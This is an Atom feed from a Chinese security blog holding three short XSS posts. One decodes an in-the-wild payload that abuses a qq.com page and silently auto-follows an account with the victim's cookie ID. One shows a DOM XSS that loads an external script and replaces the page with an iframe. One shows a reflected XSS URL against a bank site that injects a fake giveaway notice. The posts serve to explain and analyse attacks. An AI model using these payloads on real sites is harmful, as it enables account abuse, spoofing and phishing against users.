<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[分类：security | 移动开发技术]]></title>
  <link href="http://jason5.cn/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://jason5.cn/"/>
  <updated>2016-08-03T12:15:21+08:00</updated>
  <id>http://jason5.cn/</id>
  <author>
    <name><![CDATA[jason]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[XSS应用-微博刷粉]]></title>
    <link href="http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen.html"/>
    <updated>2016-08-03T11:34:13+08:00</updated>
    <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
    <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果</p>

<p>被插入代码截图如下（每个页面都有，框架被修改）</p>

<p><img src="http://jason5.cn/images/xss-weibo1.png" alt="" /></p>

<p>被插入的恶意代码为：</p>

<pre><code class="javascript">http://xxx.qq.com/popup/moodbox_share.htm?ADTAG=act.ttd.xxxshare&amp;url=1&amp;call=eval(String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,123,119,105,110,100,111,119,46,117,61,34,99,104,117,110,120,105,95,108,117,34,59,119,105,110,100,111,119,46,109,109,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,100,105,118,34,41,59,119,105,110,100,111,119,46,109,109,46,105,110,110,101,114,72,84,77,76,61,34,60,105,102,114,97,109,101,32,115,116,121,108,101,61,39,100,105,115,112,108,97,121,58,110,111,110,101,39,32,110,97,109,101,61,39,109,106,39,62,60,47,105,102,114,97,109,101,62,60,102,111,114,109,32,109,101,116,104,111,100,61,39,80,79,83,84,39,32,105,100,61,39,109,105,39,32,97,99,116,105,111,110,61,39,104,116,116,112,58,47,47,114,97,100,105,111,46,116,46,113,113,46,99,111,109,47,109,105,110,105,47,102,111,108,108,111,119,46,112,104,112,39,32,116,97,114,103,101,116,61,39,109,106,39,62,60,105,110,112,117,116,32,116,121,112,101,61,39,104,105,100,100,101,110,39,32,118,97,108,117,101,61,39,34,43,119,105,110,100,111,119,46,117,43,34,39,32,110,97,109,101,61,39,117,39,47,62,60,105,110,112,117,116,32,116,121,112,101,61,39,104,105,100,100,101,110,39,32,118,97,108,117,101,61,39,34,43,40,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,109,97,116,99,104,40,47,40,63,58,94,124,92,115,41,117,105,110,61,111,40,92,100,43,41,47,41,124,124,91,34,34,44,34,34,93,41,91,49,93,124,48,41,43,34,39,32,110,97,109,101,61,39,117,105,110,39,47,62,60,47,102,111,114,109,62,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,119,105,110,100,111,119,46,109,109,41,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,109,105,34,41,46,115,117,98,109,105,116,40,41,59,125,41,40,41))
</code></pre>

<p>解码后为:</p>

<pre><code class="javascript">http://xxx.qq.com/popup/moodbox_share.htm?ADTAG=act.ttd.xxxshare&amp;url=1&amp;call=eval( (function(){window.u="chunxi_lu";window.mm=document.createElement("div");window.mm.innerHTML="&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;&lt;input type='hidden' value='"+window.u+"' name='u'/&gt;&lt;input type='hidden' value='"+((document.cookie.match(/(?:^|\s)uin=o(\d+)/)||["",""])[1]|0)+"' name='uin'/&gt;&lt;/form&gt;";document.body.appendChild(window.mm);document.getElementById("mi").submit();})()
</code></pre>

<p>格式化</p>

<pre><code class="javascript">(function() {
    window.u = "chunxi_lu";
    window.mm = document.createElement("div");
    window.mm.innerHTML = "&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;&lt;input type='hidden' value='" + window.u + "' name='u'/&gt;&lt;input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/&gt;&lt;/form&gt;";
    document.body.appendChild(window.mm);
    document.getElementById("mi").submit();
})()
</code></pre>

<p>粉丝数刷到3w+</p>

<p><img src="http://jason5.cn/images/xss-weibo2.png" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DOM XSS]]></title>
    <link href="http://jason5.cn/blog/dom-xss.html"/>
    <updated>2016-08-03T11:04:09+08:00</updated>
    <id>http://jason5.cn/blog/dom-xss</id>
    <content type="html"><![CDATA[<p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>

<p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>

<p>page解码后为</p>

<p>```javascript</p>

<script src="http://xxxx.com/yy.js"></script>


<pre><code>
yy.js的内容
</code></pre>

<p>function window.onload(){
    parent.document.title=&ldquo;XSS test&rdquo;;
    parent.document.bgColor=&ldquo;black&rdquo;;
    parent.document.fgColor=&ldquo;white&rdquo;;
    parent.document.body.innerHTML=&ldquo;<iframe src='http://www.qqdx.albbz.cn/' width='100%' height='100%'>&rdquo;;
}
```</p>

<p>原始页面内容</p>

<p><img src="http://jason5.cn/images/xss-dom1.png" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[反射型XSS]]></title>
    <link href="http://jason5.cn/blog/fan-she-xing-xss.html"/>
    <updated>2016-08-01T20:18:08+08:00</updated>
    <id>http://jason5.cn/blog/fan-she-xing-xss</id>
    <content type="html"><![CDATA[<p>早时候出现的一个反射型XSS漏洞</p>

<p>漏洞URL
<code>
http://www.icbc.com.cn/news/hotspot.jsp?column=%3Cfont%20size=10%3E%BD%F7%B4%CB%D4%AA%B5%A9%BC%D1%BD%DA%D6%AE%BC%CA%A3%AC%B9%A4%C9%CC%D2%F8%D0%D0%B8%F8%C3%BF%B8%F6%B4%A2%BB%A7%C3%E2%B7%D1%B7%A2%B7%C51000%CD%F2%C3%C0%BD%F0%3C/font%3E
</code></p>

<p>URL decode之后
<code>
http://www.icbc.com.cn/news/hotspot.jsp?column=&lt;font size=10&gt;谨此元旦佳节之际，工商银行给每个储户免费发放1000万美金&lt;/font&gt;
</code></p>

<p>效果
<img src="http://jason5.cn/images/o_ICBC1.gif" alt="" /></p>
]]></content>
  </entry>
  
</feed>
